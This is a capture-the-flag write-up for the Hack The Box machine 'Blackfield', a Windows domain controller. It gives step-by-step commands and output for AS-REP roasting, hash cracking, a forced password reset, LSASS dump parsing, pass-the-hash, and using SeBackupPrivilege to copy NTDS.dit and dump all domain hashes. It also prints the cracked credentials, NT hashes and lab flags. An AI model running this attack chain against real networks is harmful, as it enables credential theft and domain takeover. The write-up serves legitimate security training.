# HTB Write-Up: Blackfield

| Field      | Details                                                          |
|------------|------------------------------------------------------------------|
| Platform   | [Hack The Box](https://app.hackthebox.com/machines/Blackfield)   |
| Difficulty | Hard                                                             |
| OS         | Windows                                                          |
| Date       | June 19, 2026                                                    |

---

## Table of Contents

1. [Reconnaissance](#1-reconnaissance)
2. [Enumeration — SMB Anonymous Access & Username Harvesting](#2-enumeration--smb-anonymous-access--username-harvesting)
3. [Initial Access — AS-REP Roasting & Hash Cracking](#3-initial-access--as-rep-roasting--hash-cracking)
4. [Lateral Movement — ForceChangePassword via BloodHound & bloodyAD](#4-lateral-movement--forcechangepassword-via-bloodhound--bloodyad)
5. [Credential Extraction — LSASS Dump from Forensic Share](#5-credential-extraction--lsass-dump-from-forensic-share)
6. [Privilege Escalation — SeBackupPrivilege & NTDS.dit Extraction](#6-privilege-escalation--sebackupprivilege--ntdsdit-extraction)

---

## 1. Reconnaissance

Port discovery was performed with **RustScan** for speed, followed by a targeted **Nmap** service scan on the identified ports:

```bash
rustscan -a 10.129.229.17 --ulimit=5000
```

**Open Ports:**

| Port   | Service        | Details                                              |
|--------|----------------|------------------------------------------------------|
| 53     | DNS            | Simple DNS Plus                                      |
| 88     | Kerberos       | Microsoft Windows Kerberos                           |
| 135    | MSRPC          | Microsoft Windows RPC                                |
| 139    | NetBIOS        | filtered — no response                               |
| 389    | LDAP           | Domain: `BLACKFIELD.local`                           |
| 445    | SMB            | microsoft-ds                                         |
| 593    | HTTP-RPC       | RPC over HTTP 1.0                                    |
| 3268   | Global Catalog | Microsoft Windows Active Directory LDAP              |
| 5985   | WinRM          | Windows Remote Management                            |

```bash
nmap -sC -sV -p88,389,445,593,3268 10.129.229.17
```

The detailed scan confirmed the target is a **Domain Controller** running **Windows Server 2019** (Build 17763), hostname **DC01**, domain **`BLACKFIELD.local`**. A notable clock skew of ~7 hours was detected — this will matter later for Kerberos operations. No MSSQL port is present here, making SMB and AD the primary attack surface.

---

## 2. Enumeration — SMB Anonymous Access & Username Harvesting

### 2.1 — Anonymous SMB Share Listing

The SMB shares were listed without credentials:

```bash
smbclient -L //10.129.229.17/ -N
```

**Output:**

```
Sharename       Type      Comment
---------       ----      -------
ADMIN$          Disk      Remote Admin
C$              Disk      Default share
forensic        Disk      Forensic / Audit share.
IPC$            IPC       Remote IPC
NETLOGON        Disk      Logon server share
profiles$       Disk
SYSVOL          Disk      Logon server share
```

Two shares stand out: **`forensic`** (described as a Forensic/Audit share) and **`profiles$`** (no comment — worth investigating). Anonymous access was attempted on both.

### 2.2 — profiles$ Share Enumeration

```bash
smbclient //10.129.229.17/profiles$ -N
smb: \> ls
```

The share contained a large number of empty user directories:

```
AAlleni    ABarteski    ABekesz    ABenzies    ABiemiller    AChampken    ...
```

While the directories themselves were empty, the folder names represent valid domain usernames. These were extracted into a wordlist for Kerberos enumeration:

```bash
# Save the directory listing to a file, then extract just the names
cat users | awk '{print$1}' > usernames
```

---

## 3. Initial Access — AS-REP Roasting & Hash Cracking

### 3.1 — AS-REP Roasting with GetNPUsers

With a list of potential usernames in hand, AS-REP Roasting was attempted against all of them. Accounts that have Kerberos pre-authentication disabled will respond with an encrypted ticket that can be cracked offline:

```bash
impacket-GetNPUsers BLACKFIELD.local/ -dc-ip 10.129.229.17 -usersfile usernames -request
```

The majority of usernames returned `KDC_ERR_C_PRINCIPAL_UNKNOWN`, meaning they do not exist as actual domain accounts. However, one account returned a valid AS-REP hash:

```
$krb5asrep$23$support@BLACKFIELD.LOCAL:1ec60f4302d5effaa722debfb1d6af57$d57263c54...67ff01
```

The `svc_backup` account was also found but had pre-authentication enabled, so no hash was returned for it.

### 3.2 — Hash Cracking with Hashcat

The captured AS-REP hash was saved to a file and cracked offline using Hashcat with the rockyou wordlist:

```bash
hashcat -m 18200 ticket /usr/share/wordlists/rockyou.txt
```

**Result:**

```
$krb5asrep$23$support@BLACKFIELD.LOCAL:...:#00^BlackKnight
Status: Cracked
```

Recovered credentials: **`support:#00^BlackKnight`**

### 3.3 — Validating Access

The credentials were tested against WinRM and SMB:

```bash
netexec winrm 10.129.229.17 -u support -p '#00^BlackKnight'
# [-] BLACKFIELD.local\support:#00^BlackKnight  — no WinRM access

netexec smb 10.129.229.17 -u support -p '#00^BlackKnight'
# [+] BLACKFIELD.local\support:#00^BlackKnight
```

The `support` account has valid SMB access but no WinRM access. Share enumeration showed no new readable shares beyond what anonymous access already provided. The next step is to understand what this account can do within the domain.

---

## 4. Lateral Movement — ForceChangePassword via BloodHound & bloodyAD

### 4.1 — BloodHound Data Collection

BloodHound data was collected as `support` to map out AD relationships and identify attack paths:

```bash
bloodhound-python -ns 10.129.229.17 -d BLACKFIELD.LOCAL -u support -p '#00^BlackKnight' -c All --zip
```

### 4.2 — ForceChangePassword Privilege Discovery

Analysis of the BloodHound graph revealed that the `support` account holds **ForceChangePassword** over the `audit2020` account. This privilege allows resetting the target account's password without knowing the current one.

### 4.3 — Password Reset via bloodyAD

The password of `audit2020` was reset using **bloodyAD**:

```bash
bloodyAD -d BLACKFIELD.LOCAL -u SUPPORT -p '#00^BlackKnight' --host 10.129.229.17 set password 'AUDIT2020' 'NewPassword123!'
# [+] Password changed successfully!
```

### 4.4 — Accessing the Forensic Share as audit2020

WinRM access was not available for `audit2020` either, but SMB share enumeration now showed something new:

```bash
netexec smb 10.129.229.17 -u AUDIT2020 -p 'NewPassword123!' --shares
```

**Output:**

```
Share           Permissions     Remark
-----           -----------     ------
ADMIN$                          Remote Admin
C$                              Default share
forensic        READ            Forensic / Audit share.
IPC$            READ            Remote IPC
NETLOGON        READ            Logon server share
profiles$       READ
SYSVOL          READ            Logon server share
```

The `forensic` share is now readable — a significant escalation.

---

## 5. Credential Extraction — LSASS Dump from Forensic Share

### 5.1 — Forensic Share Contents

```bash
smbclient //10.129.229.17/forensic -u AUDIT2020 -p 'NewPassword123!'
smb: \> ls
```

The share contained three directories: `commands_output`, `memory_analysis`, and `tools`. The `memory_analysis` folder held memory dumps for various Windows processes:

```
conhost.zip    ctfmon.zip    dfsrs.zip    dllhost.zip    ismserv.zip
lsass.zip      mmc.zip       RuntimeBroker.zip           ServerManager.zip
sihost.zip     smartscreen.zip            svchost.zip    taskhostw.zip
winlogon.zip   wlms.zip      WmiPrvSE.zip
```

The most valuable file here is **`lsass.zip`** — a compressed memory dump of the LSASS process, which stores cached credentials for logged-on users.

```bash
smb: \memory_analysis\> get lsass.zip
```

### 5.2 — Credential Extraction with pypykatz

After extracting the archive, the LSASS dump was parsed using **pypykatz** to extract credentials:

```bash
pypykatz lsa minidump lsass.DMP
```

Among the parsed logon sessions, the `svc_backup` account's NT hash was recovered:

```
== MSV ==
    Username: svc_backup
    Domain: BLACKFIELD
    NT: 9658d1d1dcd9250115e2205d9f48400d
```

### 5.3 — Shell as svc_backup via Pass-the-Hash

The NT hash was used to authenticate via WinRM:

```bash
evil-winrm -i 10.129.229.17 -u svc_backup -H 9658d1d1dcd9250115e2205d9f48400d
```

The user flag was retrieved from the desktop:

```powershell
*Evil-WinRM* PS C:\Users\svc_backup\Desktop> type user.txt
3920bb317a0bef51027e2852be64b543
```

---

## 6. Privilege Escalation — SeBackupPrivilege & NTDS.dit Extraction

### 6.1 — Privilege Enumeration

Checking the privileges of the `svc_backup` account revealed a highly abusable combination:

```powershell
*Evil-WinRM* PS C:\Users\svc_backup\Desktop> whoami /priv
```

**Output:**

```
Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeBackupPrivilege             Back up files and directories  Enabled
SeRestorePrivilege            Restore files and directories  Enabled
SeShutdownPrivilege           Shut down the system           Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```

**SeBackupPrivilege** and **SeRestorePrivilege** are present. These allow reading and writing any file on the system regardless of ACLs — which means `NTDS.dit` (the Active Directory database containing all domain hashes) can be extracted.

### 6.2 — VSS Shadow Copy via DiskShadow

Since `NTDS.dit` is locked by the system while the DC is running, a Volume Shadow Copy was created to access it. A DiskShadow script was written and executed:

```powershell
Set-Content -Path C:\Windows\Temp\shadow.txt -Value "set metadata C:\Windows\Temp\meta.cab`r`nset context persistent nowriters`r`nadd volume c: alias ntds_shadow`r`ncreate`r`nexpose %ntds_shadow% z:" -Encoding ASCII

diskshadow /s C:\Windows\Temp\shadow.txt
```

This created a shadow copy of the C: drive and exposed it as drive `Z:\`.

### 6.3 — Copying NTDS.dit with Robocopy

With the shadow copy mounted at `Z:\`, **robocopy** was used with the `/b` (backup mode) flag to copy the locked database file, bypassing ACL restrictions:

```powershell
robocopy /b Z:\Windows\NTDS\ C:\Windows\Temp\ ntds.dit
```

The SYSTEM registry hive was also saved — this is required to decrypt the hashes stored in `NTDS.dit`:

```powershell
reg save hklm\system system.bak
```

### 6.4 — Downloading Files & Dumping Hashes

Both files were downloaded to the attacker machine:

```powershell
copy C:\Windows\Temp\ntds.dit .
download ntds.dit
download system.bak
```

**impacket-secretsdump** was used to extract all domain hashes offline:

```bash
impacket-secretsdump -ntds ntds.dit -system system.bak local
```

**Output:**

```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:184fb5e5178480be64824d4cd53b99ee:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DC01$:1000:aad3b435b51404eeaad3b435b51404ee:7f82cc4be7ee6ca0b417c0719479dbec:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:d3c02561bba6ee4ad6cfd024ec8fda5d:::
audit2020:1103:aad3b435b51404eeaad3b435b51404ee:600a406c2c1f2062eb9bb227bad654aa:::
support:1104:aad3b435b51404eeaad3b435b51404ee:cead107bf11ebc28b3e6e90cde6d...
```

### 6.5 — Root Flag via Pass-the-Hash

The Administrator NT hash was used to authenticate directly via WinRM:

```bash
evil-winrm -i 10.129.229.17 -u Administrator -H 184fb5e5178480be64824d4cd53b99ee
```

```powershell
*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
4375a629c7c67c8e29db269060c955cb
```
